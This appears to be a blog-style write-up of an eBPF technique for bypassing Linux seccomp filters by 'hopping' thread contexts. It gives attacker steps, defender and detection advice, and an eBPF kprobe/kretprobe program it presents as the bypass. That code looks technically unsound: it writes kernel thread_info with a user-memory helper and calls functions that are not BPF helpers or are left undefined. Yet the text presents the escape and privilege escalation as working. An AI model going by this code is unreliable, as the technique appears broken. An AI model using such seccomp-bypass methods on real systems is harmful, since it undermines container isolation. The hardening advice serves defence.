Seccomp TID Hop: Bypassing System Call Filtering

Wut

A technique using eBPF to bypass seccomp filters by manipulating thread ID (TID) associations and filter inheritance. This attack allows processes to execute restricted system calls by “hopping” between thread contexts, effectively circumventing one of Linux’s core security mechanisms while maintaining the appearance of proper enforcement.

graph TD
    A[Process with Seccomp] -->|1. System Call| B[Seccomp Filter]
    C[eBPF Program] -->|2. Hook & Intercept| B
    B -->|3. Check Thread ID| D[Filter Decision]
    C -->|4. Modify TID Context| D
    D -->|5. "Allow" Decision| E[Restricted Syscall]
    F[Security Monitor] -->|6. Sees Compliance| G[False Security]

Why

Because eBPF + misconfiguration => broken isolation. Seccomp is a critical security mechanism that restricts the system calls a process can make, reducing the attack surface in containerized environments. By using eBPF to manipulate thread ID associations and filter inheritance, attackers can bypass these restrictions and execute otherwise forbidden system calls, potentially leading to container escapes or privilege escalation.

Attacker hat on

  2. Map the kernel functions responsible for seccomp filter evaluation
  3. Develop eBPF programs that hook into these seccomp functions
  4. Load the malicious BPF programs with appropriate privileges
  5. Create a mechanism to “hop” between thread contexts during syscall execution
  6. Execute restricted system calls by manipulating TID associations
  7. Maintain stealth by preserving the appearance of proper seccomp enforcement

Defender hat on

  1. Remove CAP_BPF from untrusted processes and containers
  2. Implement BPF LSM policies to restrict eBPF program loading
  3. Monitor for unexpected eBPF programs attached to seccomp-related functions
  4. Use multiple, independent security mechanisms beyond seccomp
  5. Implement integrity verification for seccomp filter application
  6. Consider using eBPF-based security tools that can detect malicious eBPF usage

Conclusion

eBPF is all you need. The ability to manipulate seccomp filter evaluation through eBPF creates a particularly dangerous scenario where processes can bypass system call restrictions while appearing compliant. This technique highlights why eBPF capabilities should be treated as highly privileged operations that require strict access controls, especially in containerized environments where seccomp is a key security boundary.

Technical Details

Seccomp Architecture

Seccomp (secure computing mode) provides:

  • System call filtering: Restricts which syscalls a process can execute
  • Filter inheritance: Child processes inherit parent’s seccomp filters
  • Thread sharing: All threads in a process share the same seccomp state
  • Filter modes: SECCOMP_MODE_STRICT (minimal syscalls) or SECCOMP_MODE_FILTER (BPF-based rules)

In containerized environments, seccomp profiles define which system calls are allowed, blocking potentially dangerous operations.

Exploitation Technique

The exploit leverages eBPF’s ability to attach to kernel functions that implement seccomp filter evaluation. By intercepting these calls, an attacker can:

  1. Hook filter evaluation: Attach to functions like seccomp_check_filter() or __secure_computing()
  2. Manipulate thread context: Temporarily modify thread ID associations during checks
  3. Create filter bypasses: Make restricted syscalls appear to come from allowed contexts
  4. Preserve audit integrity: Ensure logs show only allowed syscall patterns
  5. Maintain stealth: Restore proper context after bypassing filters

// Simplified eBPF program to bypass seccomp filters
SEC("kprobe/__secure_computing")
int BPF_KPROBE(hook_seccomp, int this_syscall, struct seccomp_data *sd)
{
    // Get process and thread information
    u32 pid = bpf_get_current_pid_tgid() >> 32;
    u32 tid = bpf_get_current_pid_tgid() & 0xFFFFFFFF;
    
    // Check if this is a restricted syscall we want to allow
    if (is_target_syscall(this_syscall)) {
        // Store original thread info
        struct thread_info *ti;
        bpf_probe_read(&ti, sizeof(ti), current_thread_info());
        
        // Find a thread with less restrictive seccomp filters
        struct task_struct *allowed_task = find_allowed_task();
        if (allowed_task) {
            // Temporarily modify thread association
            // This is a simplified representation - actual implementation
            // would be more complex and target specific data structures
            struct thread_info *allowed_ti;
            bpf_probe_read(&allowed_ti, sizeof(allowed_ti), &allowed_task->thread_info);
            
            // Swap thread info during seccomp check
            bpf_probe_write_user(current_thread_info(), allowed_ti, sizeof(*allowed_ti));
            
            // The seccomp check will now use the allowed thread's context
            // and the syscall will be permitted
            
            // Schedule restoration of original thread info after check completes
            u64 key = 0;
            struct tid_restore restore = {
                .tid = tid,
                .original_ti = ti
            };
            bpf_map_update_elem(&restore_map, &key, &restore, BPF_ANY);
        }
    }
    
    return 0;
}

// Hook return from seccomp check to restore thread info
SEC("kretprobe/__secure_computing")
int BPF_KRETPROBE(hook_seccomp_ret)
{
    // Get thread ID
    u32 tid = bpf_get_current_pid_tgid() & 0xFFFFFFFF;
    
    // Check if we need to restore thread info for this thread
    u64 key = 0;
    struct tid_restore *restore = bpf_map_lookup_elem(&restore_map, &key);
    
    if (restore && restore->tid == tid) {
        // Restore original thread info
        bpf_probe_write_user(current_thread_info(), restore->original_ti, sizeof(*restore->original_ti));
        
        // Clear the map entry
        bpf_map_delete_elem(&restore_map, &key);
    }
    
    return 0;
}

Detection Methods

Defenders should monitor for:

  • Unexpected eBPF programs attached to seccomp-related functions
  • Discrepancies between configured seccomp profiles and actual syscall patterns
  • Unusual thread behavior during syscall execution
  • Processes executing syscalls that should be blocked by their seccomp profile
  • Inconsistencies in thread context during security-sensitive operations

This technique demonstrates why proper eBPF restrictions are critical for maintaining the integrity of seccomp filtering, especially in containerized environments where system call restrictions are a key security boundary.

Real-world Impact

In practical environments, this technique could allow an attacker to:

  • Container escape: Execute syscalls needed to break out of container isolation
  • Privilege escalation: Perform privileged operations despite seccomp restrictions
  • Security bypass: Circumvent security controls that rely on syscall filtering
  • Malware execution: Run malicious code that would normally be blocked
  • Persistence: Maintain access despite security hardening measures

The ability to bypass seccomp filters creates a particularly concerning scenario for containerized environments, Kubernetes clusters, and any system relying on syscall filtering as a security boundary.
